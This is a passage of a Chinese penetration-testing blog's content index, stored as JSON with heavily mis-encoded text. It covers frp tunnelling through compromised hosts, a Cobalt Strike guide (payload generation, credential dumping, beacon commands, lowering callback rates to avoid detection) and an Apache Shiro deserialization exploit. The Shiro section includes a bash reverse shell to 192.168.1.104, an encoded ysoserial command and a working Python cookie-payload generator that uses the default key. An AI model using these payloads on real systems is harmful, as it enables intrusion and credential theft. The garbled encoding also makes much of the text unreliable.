WindowsWindowsä¸­å¯ç»“åˆProxifierã€SSTapç­‰å·¥å…·ï¼Œå¯è®¾ç½®socks5å£ä»¤ï¼Œä»¥æ­¤è¾¾åˆ°ç”¨windowsæ¸—é€å·¥å…·æ¨ªå‘ç©¿é€çš„æ•ˆæœã€‚ å°ç»“Frpçš„ç”¨æ³•æ¯”è¾ƒçµæ´»ä¸”è¿è¡Œç¨³å®šã€‚å¦‚ å¯å°†frpæœåŠ¡ç«¯æŒ‚åœ¨â€œè‚‰é¸¡â€ä¸Šï¼Œä»¥è¾¾åˆ°éšè”½æ€§ï¼Œä¹Ÿå¯å°†å®¢æˆ·ç«¯åšæˆæœåŠ¡è‡ªå¯çš„å½¢å¼ç­‰ï¼Œå®æˆ˜ä¸­å¯è‡ªç”±å‘æŒ¥ã€‚","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"å†…ç½‘ç©¿é€","slug":"å†…ç½‘ç©¿é€","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"CobaltStrikeåŸºæœ¬åŠŸèƒ½ä¸ä½¿ç”¨","slug":"CobaltStrikeåŸºæœ¬åŠŸèƒ½ä¸ä½¿ç”¨","date":"2019-12-04T10:47:29.000Z","updated":"2021-07-07T07:16:04.770Z","comments":true,"path":"2019/1204/.html","link":"","permalink":"https://payloads.cn/2019/1204/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€Cobalt Strike ä¸€æ¬¾ä»¥Metasploitä¸ºåŸºç¡€çš„GUIæ¡†æ¶å¼æ¸—é€æµ‹è¯•å·¥å…·ï¼Œé›†æˆäº†ç«¯å£è½¬å‘ã€æœåŠ¡æ‰«æï¼Œè‡ªåŠ¨åŒ–æº¢å‡ºï¼Œå¤šæ¨¡å¼ç«¯å£ç›‘å¬ï¼Œexeã€powershellæœ¨é©¬ç”Ÿæˆç­‰ã€‚ é’“é±¼æ”»å‡»åŒ…æ‹¬ï¼šç«™ç‚¹å…‹éš†ï¼Œç›®æ ‡ä¿¡æ¯è·å–ï¼Œjavaæ‰§è¡Œï¼Œæµè§ˆå™¨è‡ªåŠ¨æ”»å‡»ç­‰ã€‚ Cobalt Strike ä¸»è¦ç”¨äºå›¢é˜Ÿä½œæˆ˜ï¼Œå¯è°“æ˜¯å›¢é˜Ÿæ¸—é€ç¥å™¨ï¼Œèƒ½è®©å¤šä¸ªæ”»å‡»è€…åŒæ—¶è¿æ¥åˆ°å›¢ä½“æœåŠ¡å™¨ä¸Šï¼Œå…±äº«æ”»å‡»èµ„æºä¸ç›®æ ‡ä¿¡æ¯å’Œsessionsã€‚ Cobalt Strike ä½œä¸ºä¸€æ¬¾ååŒAPTå·¥å…·ï¼Œé’ˆå¯¹å†…ç½‘çš„æ¸—é€æµ‹è¯•å’Œä½œä¸ºaptçš„æ§åˆ¶ç»ˆç«¯åŠŸèƒ½ï¼Œä½¿å…¶å˜æˆä¼—å¤šAPTç»„ç»‡çš„é¦–é€‰ã€‚ åŸºæœ¬åŠŸèƒ½å®‰è£…Cobalt Strike åˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ï¼Œå¯åˆ†å¸ƒå¼æ“ä½œã€ååŒä½œæˆ˜ã€‚æœåŠ¡å™¨ç«¯åªèƒ½è¿è¡Œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¯æ­å»ºåœ¨VPSä¸Šã€‚ æœåŠ¡ç«¯æœåŠ¡ç«¯å…³é”®çš„æ–‡ä»¶æ˜¯teamserverä»¥åŠcobaltstrike.jarï¼Œå°†è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ°æœåŠ¡å™¨ä¸ŠåŒä¸€ä¸ªç›®å½•ï¼Œç„¶åè¿è¡Œï¼š 123chmod +x teamserver./teamserver 10.11.42.202 test123 # æœåŠ¡ç«¯çœŸå®IP(ä¸èƒ½ä½¿ç”¨0.0.0.0æˆ–127.0.0.1)å’Œè¿æ¥å¯†ç  å®¢æˆ·ç«¯å®¢æˆ·ç«¯åœ¨Windowsã€Linuxã€Macä¸‹éƒ½å¯ä»¥è¿è¡Œ (éœ€è¦é…ç½®å¥½Javaç¯å¢ƒ)ã€‚å¯åŠ¨Cobalt Strikeå®¢æˆ·ç«¯ï¼Œè¾“å…¥æœåŠ¡ç«¯çš„IPä»¥åŠç«¯å£ã€è¿æ¥å¯†ç ï¼Œç”¨æˆ·åå¯ä»¥ä»»æ„è®¾ç½®ã€‚ åœ¨æ§åˆ¶å°æ‰€æœ‰æ“ä½œæŒ‡ä»¤éƒ½ä¼šè¢«è®°å½•ä¿ç•™åœ¨Cobalt Strikeç›®å½•logsä¸‹ã€‚ å‚æ•°è¯¦æƒ…Cobalt Strike 1234567New Connection #æ–°çš„è¿æ¥(æ”¯æŒè¿æ¥å¤šä¸ªæœåŠ¡å™¨ç«¯)Preferences #åå¥½è®¾ç½®(è®¾ç½®Cobal Strikeç•Œé¢ã€æ§åˆ¶å°ã€ä»¥åŠè¾“å‡ºæŠ¥å‘Šæ ·å¼ã€TeamServerè¿æ¥è®°å½•ç­‰)Visualization #çª—å£è§†å›¾æ¨¡å¼(å±•ç¤ºè¾“å‡ºç»“æœçš„å½¢å¼)VPN Interfaces #VPNæ¥å…¥Listenrs #ç›‘å¬å™¨(åˆ›å»ºListener)Script Manager #è„šæœ¬ç®¡ç†Close #å…³é—­ View 12345678910Applications #åº”ç”¨(æ˜¾ç¤ºå—å®³è€…æœºå™¨çš„åº”ç”¨ä¿¡æ¯)Credentials #å‡­è¯(é€šè¿‡hashdumpæˆ–MimikatzæŠ“å–è¿‡çš„å¯†ç éƒ½ä¼šå‚¨å­˜åœ¨è¿™é‡Œ)Downloads #ä¸‹è½½æ–‡ä»¶Event Log #äº‹ä»¶æ—¥å¿—(ä¸»æœºä¸Šçº¿è®°å½•ä»¥åŠå›¢é˜Ÿåä½œèŠå¤©è®°å½•)Keystrokes #é”®ç›˜è®°å½•Proxy Pivots #ä»£ç†æ¨¡å—Screenshots #æˆªå›¾Script Console #è„šæœ¬æ§åˆ¶å°(å¯ä»¥åŠ è½½å„ç§è„šæœ¬ï¼Œå¢å¼ºåŠŸèƒ½https://github.com/rsmudge/cortana-scripts)Targets #æ˜¾ç¤ºç›®æ ‡ä¸»æœºWeb Log #Webæ—¥å¿— AttacksPackages 1234567HTML Application #ç”Ÿæˆæ¶æ„çš„HTAæœ¨é©¬æ–‡ä»¶MS Office Macro #ç”Ÿæˆofficeå®ç—…æ¯’æ–‡ä»¶Payload Generator #ç”Ÿæˆå„ç§è¯­è¨€ç‰ˆæœ¬çš„payloadUSB/CD AutoPlay #ç”Ÿæˆåˆ©ç”¨è‡ªåŠ¨æ’­æ”¾è¿è¡Œçš„æœ¨é©¬æ–‡ä»¶Windows Dropper #æ†ç»‘å™¨ï¼Œèƒ½å¤Ÿå¯¹æ–‡æ¡£ç±»è¿›è¡Œæ†ç»‘Windows Executable #ç”Ÿæˆå¯æ‰§è¡ŒPayloadWindows Executable(S) #æŠŠåŒ…å«payload,Stagelessç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶(åŒ…å«å¤šæ•°åŠŸèƒ½) Web Drive-by 1234567Manage #å¯¹å¼€å¯çš„webæœåŠ¡è¿›è¡Œç®¡ç†Clone Site #å…‹éš†ç½‘ç«™(å¯è®°å½•å—å®³è€…æäº¤çš„æ•°æ®)Host File #æä¾›Webä»¥ä¾›ä¸‹è½½æŸæ–‡ä»¶Scripted Web Delivery #æä¾›WebæœåŠ¡ï¼Œä¾¿äºä¸‹è½½å’Œæ‰§è¡ŒPowerShell Payloadï¼Œç±»ä¼¼äºMetasploitçš„web_delivery Signed Applet Attack #å¯åŠ¨ä¸€ä¸ªWebæœåŠ¡ä»¥æä¾›è‡ªç­¾åJava Appletçš„è¿è¡Œç¯å¢ƒSmart Applet Attack #è‡ªåŠ¨æ£€æµ‹Javaç‰ˆæœ¬å¹¶åˆ©ç”¨å·²çŸ¥çš„exploitsç»•è¿‡securitySystem Profiler #ç”¨æ¥è·å–ä¸€äº›ç³»ç»Ÿä¿¡æ¯ï¼Œæ¯”å¦‚ç³»ç»Ÿç‰ˆæœ¬ï¼ŒFlashç‰ˆæœ¬ï¼Œæµè§ˆå™¨ç‰ˆæœ¬ç­‰ Reporting 123456780. Activity report #æ´»åŠ¨æŠ¥å‘Š1. Hosts report #ä¸»æœºæŠ¥å‘Š2. Indicators of Compromise #å¨èƒæŠ¥å‘Š3. Sessions report #ä¼šè¯æŠ¥å‘Š4. Social engineering report #ç¤¾ä¼šå·¥ç¨‹å­¦æŠ¥å‘Š5. Tactics, Techniques, and Procedures #ç­–ç•¥ã€æŠ€å·§å’Œç¨‹åº Reset Data #é‡ç½®æ•°æ®Export Data #å¯¼å‡ºæ•°æ® Help 12345Homepage #å®˜æ–¹ä¸»é¡µSupport #æŠ€æœ¯æ”¯æŒArsenal #å¼€å‘è€…System information #ç‰ˆæœ¬ä¿¡æ¯About #å…³äº å³é”®èœå• Access123456Dump Hashes #è·å–hashElevate #ææƒGolden Ticket #ç”Ÿæˆé»„é‡‘ç¥¨æ®æ³¨å…¥å½“å‰ä¼šè¯Make token #å‡­è¯è½¬æ¢Run Mimikatz #è¿è¡Œ Mimikatz Spawn As #ç”¨å…¶ä»–ç”¨æˆ·ç”ŸæˆCobalt Strikeä¾¦å¬å™¨ Explore1234567Browser Pivot #åŠ«æŒç›®æ ‡æµè§ˆå™¨è¿›ç¨‹Desktop(VNC) #æ¡Œé¢äº¤äº’File Browser #æ–‡ä»¶æµè§ˆå™¨Net View #å‘½ä»¤Net ViewPort Scan #ç«¯å£æ‰«æProcess List #è¿›ç¨‹åˆ—è¡¨Screenshot #æˆªå›¾ Pivoting123SOCKS Server #ä»£ç†æœåŠ¡Listener #åå‘ç«¯å£è½¬å‘Deploy VPN #éƒ¨ç½²VPN Spawnå¤–éƒ¨ç›‘å¬å™¨(å¦‚æŒ‡æ´¾ç»™MSFï¼Œè·å–meterpreteræƒé™) Session1234Note #å¤‡æ³¨Remove #åˆ é™¤Sleep #æŒ‡å®šè¢«æ§ç«¯ä¼‘çœ æ—¶é—´ï¼Œé»˜è®¤60ç§’ä¸€æ¬¡å›ä¼ ï¼Œè®©è¢«æ§ç«¯æ¯10ç§’æ¥ä¸‹è½½ä¸€æ¬¡ä»»åŠ¡ã€‚å®é™…ä¸­é¢‘ç‡ä¸å®œè¿‡å¿«,å®¹æ˜“è¢«å‘ç°ã€‚Exit #é€€å‡º Interact(æ‰“å¼€beacon)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495beacon&gt; helpBeacon Commands===============Command Description------- -----------argue è¿›ç¨‹å‚æ•°æ¬ºéª—blockdlls é˜»æ­¢å­è¿›ç¨‹åŠ è½½éMicrosoft DLLbrowserpivot æ³¨å…¥å—å®³è€…æµè§ˆå™¨è¿›ç¨‹bypassuac ç»•è¿‡UACæå‡æƒé™cancel å–æ¶ˆæ­£åœ¨è¿›è¡Œçš„ä¸‹è½½cd åˆ‡æ¢ç›®å½•checkin å¼ºåˆ¶è®©è¢«æ§ç«¯å›è¿ä¸€æ¬¡clear æ¸…é™¤beaconå†…éƒ¨çš„ä»»åŠ¡é˜Ÿåˆ—connect Connect to a Beacon peer over TCPcovertvpn éƒ¨ç½²Covert VPNå®¢æˆ·ç«¯cp å¤åˆ¶æ–‡ä»¶dcsync ä»DCä¸­æå–å¯†ç å“ˆå¸Œdesktop è¿œç¨‹æ¡Œé¢(VNC)dllinject åå°„DLLæ³¨å…¥è¿›ç¨‹dllload ä½¿ç”¨LoadLibraryå°†DLLåŠ è½½åˆ°è¿›ç¨‹ä¸­download ä¸‹è½½æ–‡ä»¶downloads åˆ—å‡ºæ­£åœ¨è¿›è¡Œçš„æ–‡ä»¶ä¸‹è½½drives åˆ—å‡ºç›®æ ‡ç›˜ç¬¦elevate ä½¿ç”¨expexecute åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(æ— è¾“å‡º)execute-assembly åœ¨ç›®æ ‡ä¸Šå†…å­˜ä¸­æ‰§è¡Œæœ¬åœ°.NETç¨‹åºexit ç»ˆæ­¢beaconä¼šè¯getprivs Enable system privileges on current tokengetsystem å°è¯•è·å–SYSTEMæƒé™getuid è·å–ç”¨æˆ·IDhashdump è½¬å‚¨å¯†ç å“ˆå¸Œå€¼help å¸®åŠ©inject åœ¨æ³¨å…¥è¿›ç¨‹ç”Ÿæˆä¼šè¯jobkill ç»“æŸä¸€ä¸ªåå°ä»»åŠ¡jobs åˆ—å‡ºåå°ä»»åŠ¡kerberos_ccache_use ä»ccacheæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯kerberos_ticket_purge æ¸…é™¤å½“å‰ä¼šè¯çš„ç¥¨æ®kerberos_ticket_use Apply ä»ticketæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯keylogger é”®ç›˜è®°å½•kill ç»“æŸè¿›ç¨‹link Connect to a Beacon peer over a named pipelogonpasswords ä½¿ç”¨mimikatzè½¬å‚¨å‡­æ®å’Œå“ˆå¸Œå€¼ls åˆ—å‡ºæ–‡ä»¶make_token åˆ›å»ºä»¤ç‰Œä»¥ä¼ é€’å‡­æ®mimikatz è¿è¡Œmimikatzmkdir åˆ›å»ºä¸€ä¸ªç›®å½•mode dns ä½¿ç”¨DNS Aä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)mode dns-txt ä½¿ç”¨DNS TXTä½œä¸ºé€šä¿¡é€šé“(ä»…é™D beacon)mode dns6 ä½¿ç”¨DNS AAAAä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)mode http ä½¿ç”¨HTTPä½œä¸ºé€šä¿¡é€šé“mv ç§»åŠ¨æ–‡ä»¶net netå‘½ä»¤note å¤‡æ³¨ portscan è¿›è¡Œç«¯å£æ‰«æpowerpick é€šè¿‡Unmanaged PowerShellæ‰§è¡Œå‘½ä»¤powershell é€šè¿‡powershell.exeæ‰§è¡Œå‘½ä»¤powershell-import å¯¼å…¥powershellè„šæœ¬ppid Set parent PID for spawned post-ex jobsps æ˜¾ç¤ºè¿›ç¨‹åˆ—è¡¨psexec Use a service to spawn a session on a hostpsexec_psh Use PowerShell to spawn a session on a hostpsinject åœ¨ç‰¹å®šè¿›ç¨‹ä¸­æ‰§è¡ŒPowerShellå‘½ä»¤pth ä½¿ç”¨Mimikatzè¿›è¡Œä¼ é€’å“ˆå¸Œpwd å½“å‰ç›®å½•ä½ç½®reg Query the registryrev2self æ¢å¤åŸå§‹ä»¤ç‰Œrm åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹rportfwd ç«¯å£è½¬å‘run åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(è¿”å›è¾“å‡º)runas ä»¥å…¶ä»–ç”¨æˆ·æƒé™æ‰§è¡Œç¨‹åºrunasadmin åœ¨é«˜æƒé™ä¸‹æ‰§è¡Œç¨‹åºrunu Execute a program under another PIDscreenshot å±å¹•æˆªå›¾setenv è®¾ç½®ç¯å¢ƒå˜é‡shell æ‰§è¡Œcmdå‘½ä»¤shinject å°†shellcodeæ³¨å…¥è¿›ç¨‹shspawn å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹å¹¶å°†shellcodeæ³¨å…¥å…¶ä¸­sleep è®¾ç½®ç¡çœ å»¶è¿Ÿæ—¶é—´socks å¯åŠ¨SOCKS4ä»£ç†socks stop åœæ­¢SOCKS4spawn Spawn a session spawnas Spawn a session as another userspawnto Set executable to spawn processes intospawnu Spawn a session under another PIDssh ä½¿ç”¨sshè¿æ¥è¿œç¨‹ä¸»æœºssh-key ä½¿ç”¨å¯†é’¥è¿æ¥è¿œç¨‹ä¸»æœºsteal_token ä»è¿›ç¨‹ä¸­çªƒå–ä»¤ç‰Œtimestomp å°†ä¸€ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³åº”ç”¨åˆ°å¦ä¸€ä¸ªæ–‡ä»¶unlink Disconnect from parent Beaconupload ä¸Šä¼ æ–‡ä»¶wdigest ä½¿ç”¨mimikatzè½¬å‚¨æ˜æ–‡å‡­æ®winrm ä½¿ç”¨WinRMæ¨ªå‘æ¸—é€wmi ä½¿ç”¨WMIæ¨ªå‘æ¸—é€ ä½¿ç”¨Listenersç®€ä»‹åœ¨æœ¬ç‰ˆæœ¬Cobalt Strike 3.14ä¸­ï¼Œæä¾›äº†å¦‚å›¾9ç§ Listener (ç›‘å¬å™¨)ã€‚ 123456789windows&#x2F;beacon_dns&#x2F;reverse_dns_txtwindows&#x2F;beacon_dns&#x2F;reverse_httpwindows&#x2F;beacon_http&#x2F;reverse_httpwindows&#x2F;beacon_https&#x2F;reverse_httpswindows&#x2F;beacon_smb&#x2F;bind_pipewindows&#x2F;beacon_tcp&#x2F;bind_tcpwindows&#x2F;foreign&#x2F;reverse_httpwindows&#x2F;foreign&#x2F;reverse_httpswindows&#x2F;foreign&#x2F;reverse_tcp (3.13ç‰ˆåå¢åŠ ï¼Œæ”¯æŒlinuxSSHä¼šè¯) beacon_xx ç³»åˆ—ä¸ºCobalt Strikeè‡ªèº«ï¼ŒåŒ…æ‹¬ dnsã€httpã€httpsã€smb å››ç§æ–¹å¼çš„ç›‘å¬å™¨ã€‚ foreign ç³»åˆ—ä¸ºå¤–éƒ¨ç›‘å¬å™¨ï¼Œé€šå¸¸ä¸MSFæˆ–è€…Armitageè”åŠ¨ã€‚ åœ¨Cobalt Strike 3.13ç‰ˆæœ¬åå¢åŠ äº†ä¸€ä¸ªæ–°çš„ Listeners (windows/beacon_tcp/bind_tcp) ï¼Œå®ƒæ”¯æŒlinuxSSHä¼šè¯ã€‚å…·ä½“æ›´æ–°å†…å®¹å¯ä»¥æŸ¥é˜… å®˜ç½‘ ã€‚ åˆ›å»ºä¸€ä¸ªæœåŠ¡é¦–å…ˆé…ç½®ä¸€ä¸ªç›‘å¬å™¨ é€‰æ‹© Attacks &gt; Packages &gt; Windows Executable ä¸Šçº¿æˆåŠŸï¼Œåœ¨ Event Log å¤„å‡ºç°ä¸Šçº¿ä¿¡æ¯ã€‚ Beaconå³é”®ç›®æ ‡interactæ¥ä½¿ç”¨Beaconï¼Œç”¨å®ƒæ¥æ‰§è¡Œå„ç§å‘½ä»¤ã€‚åœ¨Cobalt Strikeä¸­ï¼Œé»˜è®¤å¿ƒè·³ä¸º60sï¼Œæ‰§è¡Œå‘½ä»¤çš„å“åº”å¾ˆæ…¢ï¼Œåœ¨ä¸‹è½½æ–‡ä»¶æ—¶æ›´åŠ æ˜æ˜¾ï¼Œæ‰€ä»¥æ ¹æ®å®æˆ˜ç¯å¢ƒæŠŠæ—¶é—´é™ä½ï¼Œå»ºè®®ä¸è¦å¤ªå¿«ï¼Œå¦åˆ™æµé‡ä¼šç›¸å¯¹æ˜æ˜¾ï¼Œåœ¨è¿™é‡Œè®¾ç½®sleep 10ã€‚ åŒæ—¶åœ¨beaconä¸­ï¼Œå¦‚æœæƒ³å¯¹ç›®æ ‡è¿›è¡Œå‘½ä»¤ç®¡ç†ï¼Œéœ€è¦åœ¨å‰é¢åŠ ä¸Šshellï¼Œå¦‚shell whoamiã€shell ipconfigç­‰ã€‚ æ€»ç»“è¿™é‡Œåªæ˜¯ç®€å•æè¿°CobaltStrikeçš„ç”¨æ³•ï¼Œå…¶ä¸­è¿˜æœ‰å¾ˆå¤šåŠŸèƒ½çš„ä½¿ç”¨ï¼Œéœ€è¦å®é™…æ“ä½œä¸­å»å‘ç°ã€‚æ›´æ ¸å¿ƒçš„åœ°æ–¹åœ¨äºç†è§£CobaltStrikeçš„Beaconåœ¨å†…ç½‘ä¸­çš„é€šä¿¡è¿‡ç¨‹ï¼Œè¿™å¯¹äºæ¸—é€è€…èƒ½å¦æ›´è¿›ä¸€æ­¥æ·±å…¥å†…ç½‘èµ·åˆ°é‡è¦ä½œç”¨ï¼Œä¹Ÿæ˜¯ç¥å™¨çš„ä»·å€¼æ‰€åœ¨ã€‚ åœ¨æ¸—é€è¿‡ç¨‹ä¸­ï¼Œä¸è¦ä»…é™äºå•ä¸€æ¨¡å¼çš„æ€è·¯ï¼Œæ ¹æ®å®é™…çš„æƒ…å†µï¼Œé€‰æ‹©æ›´ä¼˜çš„æ–¹æ³•æ¥è¿›è¡Œä¸‹ä¸€æ­¥çš„æ¸—é€æµ‹è¯•ã€‚","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"Shiroååºåˆ—åŒ–æ¼æ´å¤ç°","slug":"Shiroååºåˆ—åŒ–æ¼æ´å¤ç°","date":"2019-12-03T19:45:48.000Z","updated":"2021-08-06T02:36:12.441Z","comments":true,"path":"2019/1204/.html","link":"","permalink":"https://payloads.cn/2019/1204/.html","excerpt":"","text":"å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚ â€”â€”AnonySec https://payloads.cn å‰è¨€Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§ä¸”æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶,æ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€å¯†ç å’Œä¼šè¯ç®¡ç†ã€‚ä½¿ç”¨Shiroçš„æ˜“äºç†è§£çš„APIï¼Œæ‚¨å¯ä»¥å¿«é€Ÿã€è½»æ¾åœ°è·å¾—ä»»ä½•åº”ç”¨ç¨‹åºï¼Œä»æœ€å°çš„ç§»åŠ¨åº”ç”¨ç¨‹åºåˆ°æœ€å¤§çš„ç½‘ç»œå’Œä¼ä¸šåº”ç”¨ç¨‹åºã€‚ å®˜æ–¹æ¼æ´è¯´æ˜ï¼šhttps://issues.apache.org/jira/browse/SHIRO-550 Shiroæä¾›äº†è®°ä½æˆ‘ï¼ˆRememberMeï¼‰çš„åŠŸèƒ½ï¼Œå…³é—­äº†æµè§ˆå™¨ä¸‹æ¬¡å†æ‰“å¼€æ—¶è¿˜æ˜¯èƒ½è®°ä½ä½ æ˜¯è°ï¼Œä¸‹æ¬¡è®¿é—®æ—¶æ— éœ€å†ç™»å½•å³å¯è®¿é—®ã€‚ Shiroå¯¹rememberMeçš„cookieåšäº†åŠ å¯†å¤„ç†ï¼Œé»˜è®¤ä½¿ç”¨äº†CookieRememberMeManagerå­—æ®µï¼Œå†…å®¹åˆ†åˆ«è¿›è¡Œ åºåˆ—åŒ–ã€AESåŠ å¯†ã€Base64ç¼–ç æ“ä½œã€‚ åœ¨è¯†åˆ«èº«ä»½çš„æ—¶å€™ï¼Œéœ€è¦å¯¹Cookieé‡Œçš„rememberMeå­—æ®µè§£å¯†ã€‚æ ¹æ®åŠ å¯†çš„é¡ºåºï¼Œå¾—çŸ¥è§£å¯†çš„é¡ºåºä¸ºï¼š å¾—åˆ°rememberMeçš„cookieå€¼â€“&gt;Base64è§£ç â€“&gt;AESè§£å¯†â€“&gt;ååºåˆ—åŒ–ã€‚ ä½†æ˜¯ï¼ŒAESåŠ å¯†çš„å¯†é’¥Keyè¢«ç¡¬ç¼–ç åœ¨ä»£ç é‡Œï¼Œæ„å‘³ç€æ¯ä¸ªäººé€šè¿‡æºä»£ç éƒ½èƒ½æ‹¿åˆ°AESåŠ å¯†çš„å¯†é’¥ã€‚å› æ­¤ï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„å¯¹è±¡ï¼Œå¹¶ä¸”å¯¹å…¶åºåˆ—åŒ–ï¼ŒAESåŠ å¯†ï¼Œbase64ç¼–ç åï¼Œä½œä¸ºcookieçš„rememberMeå­—æ®µå‘é€ã€‚Shiroå°†rememberMeè¿›è¡Œè§£å¯†å¹¶ä¸”ååºåˆ—åŒ–ï¼Œæœ€ç»ˆé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚ æ£€æµ‹æ˜¯å¦æ˜¯shiroåœ¨cookieå‚æ•°ååŠ ä¸Š;rememberMe=1ï¼Œå¦‚æœè¿”å›åŒ…ä¸­å«æœ‰Set-Cookie:rememberMe=deleteMeå°±æ˜¯ä½¿ç”¨äº†shrioã€‚ å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt;= 1.2.4 NCç›‘å¬åå¼¹ Shell1nc -lvp 7878 åˆ¶ä½œåå¼¹shell ä»£ç  ä½¿ç”¨ http://www.jackson-t.ca/runtime-exec-payloads.html è¿›è¡Œç¼–ç ã€‚ 1bash -i &gt;&amp; /dev/tcp/192.168.1.104/7878 0&gt;&amp;1 ä½¿ç”¨ysoserialä¸­JRMPç›‘å¬æ¨¡å—https://github.com/frohoff/ysoserial 12java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections4 &#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA0Lzc4NzggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;#åå¼¹ shell éœ€è¦è¿›è¡Œjava base64 ç¼–ç ) Payload æ„é€ å‰16å­—èŠ‚çš„å¯†é’¥â€“&gt;åé¢åŠ å…¥åºåˆ—åŒ–å‚æ•°â€“&gt;AESåŠ å¯†â€“&gt;base64ç¼–ç â€“&gt;å‘é€cookieã€‚ shiro.py 123456789101112131415161718192021import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command): popen = subprocess.Popen([&#x27;java&#x27;, &#x27;-jar&#x27;, &#x27;ysoserial.jar&#x27;, &#x27;JRMPClient&#x27;, command], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;) iv = uuid.uuid4().bytes encryptor = AES.new(key, AES.MODE_CBC, iv) file_body = pad(popen.stdout.read()) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) return base64_ciphertextif __name__ == &#x27;__main__&#x27;: payload = encode_rememberme(sys.argv[1])print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode()) ä½¿ç”¨ç”Ÿæˆ payloadçš„ysoserial.jaræ–‡ä»¶å’Œè¿è¡Œç›®å½•éœ€å¤„äºåŒä¸€ç›®å½•ä¸‹ã€‚ å°†ç”Ÿæˆçš„payloadé€šè¿‡BurpSuiteè¿›è¡Œæ›¿æ¢å‘é€ã€‚ æœ€ç»ˆï¼Œå¯çœ‹åˆ°NCå·²ç»æ”¶åˆ°åå¼¹è¿‡æ¥çš„ shell ã€‚","categories":[],"tags":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://payloads.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]}],"categories":[{"name":"æƒé™ç»´æŒ","slug":"æƒé™ç»´æŒ","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"name":"Skills","slug":"Skills","permalink":"https://payloads.cn/categories/Skills/"},{"name":"ä¿¡æ¯æ”¶é›†","slug":"ä¿¡æ¯æ”¶é›†","permalink":"https://payloads.cn/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"æµé‡åˆ†æ","slug":"æµé‡åˆ†æ","permalink":"https://payloads.cn/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"},{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"},{"name":"ç«¯å£è½¬å‘","slug":"ç«¯å£è½¬å‘","permalink":"https://payloads.cn/categories/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"},{"name":"å¯†ç æœé›†","slug":"å¯†ç æœé›†","permalink":"https://payloads.cn/categories/%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://payloads.cn/tags/Windows/"},{"name":"Mail","slug":"Mail","permalink":"https://payloads.cn/tags/Mail/"},{"name":"Linux","slug":"Linux","permalink":"https://payloads.cn/tags/Linux/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"},{"name":"å†…ç½‘ç©¿é€","slug":"å†…ç½‘ç©¿é€","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"},{"name":"Office","slug":"Office","permalink":"https://payloads.cn/tags/Office/"},{"name":"è§£å¯†å®¢æˆ·ç«¯","slug":"è§£å¯†å®¢æˆ·ç«¯","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"},{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://payloads.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}]}